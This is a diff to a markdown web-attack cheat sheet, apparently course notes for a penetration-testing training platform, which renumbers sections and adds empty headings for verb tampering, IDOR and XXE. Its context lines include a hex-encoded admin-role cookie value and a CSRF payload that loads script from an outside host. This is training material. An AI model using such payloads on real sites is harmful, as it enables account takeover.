@@ -20,11 +20,13 @@ Overview
 16. - [eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection](#16---extensible-stylesheet-language-transformations-xslt-server-side-injection)
 17. - [Login Brute Forcing](#17---login-brute-forcing)
 18. - [Broken Authentication](#18---broken-authentication)
-19. - [Sensitive Data Exposure](#19---sensitive-data-exposure)
-20. - [HTML Injection](#20---html-injection)
-21. - [Cross-Site Request Forgery (CSRF)](#21---cross-site-request-forgery-csrf)
-22. - [Exploit Research](#22---exploit-research)
-
+19. - [HTTP Verb Tampering](#19---http-verb-tampering)
+20. - [Insecure Direct Object References (IDOR)](#20---insecure-direct-object-references-idor)
+21. - [XML External Entity (XXE) Injection](#21---xml-external-entity-xxe-injection)
+22. - [Sensitive Data Exposure](#22---sensitive-data-exposure)
+23. - [HTML Injection](#23---html-injection)
+24. - [Cross-Site Request Forgery (CSRF)](#24---cross-site-request-forgery-csrf)
+25. - [Exploit Research](#25---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1188,7 +1190,16 @@ $ echo -n 'user=htb-stdnt;role=admin' | xxd -p
 757365723d6874622d7374646e743b726f6c653d61646d696e
 ```
 
-#19. - Sensitive Data Exposure
+#19. - HTTP Verb Tampering
+-----------------------------------------
+
+#20. - Insecure Direct Object References (IDOR)
+-----------------------------------------
+
+#21. - XML External Entity (XXE) Injection
+-----------------------------------------
+
+#22. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -1199,7 +1210,7 @@ OR
 CTRL + U
 ```
 
-#20. - HTML Injection
+#23. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -1209,7 +1220,7 @@ CTRL + U
 ```
 
 
-#21. - Cross-Site Request Forgery (CSRF)
+#24. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -1218,7 +1229,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#22. - Exploit Research
+#25. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
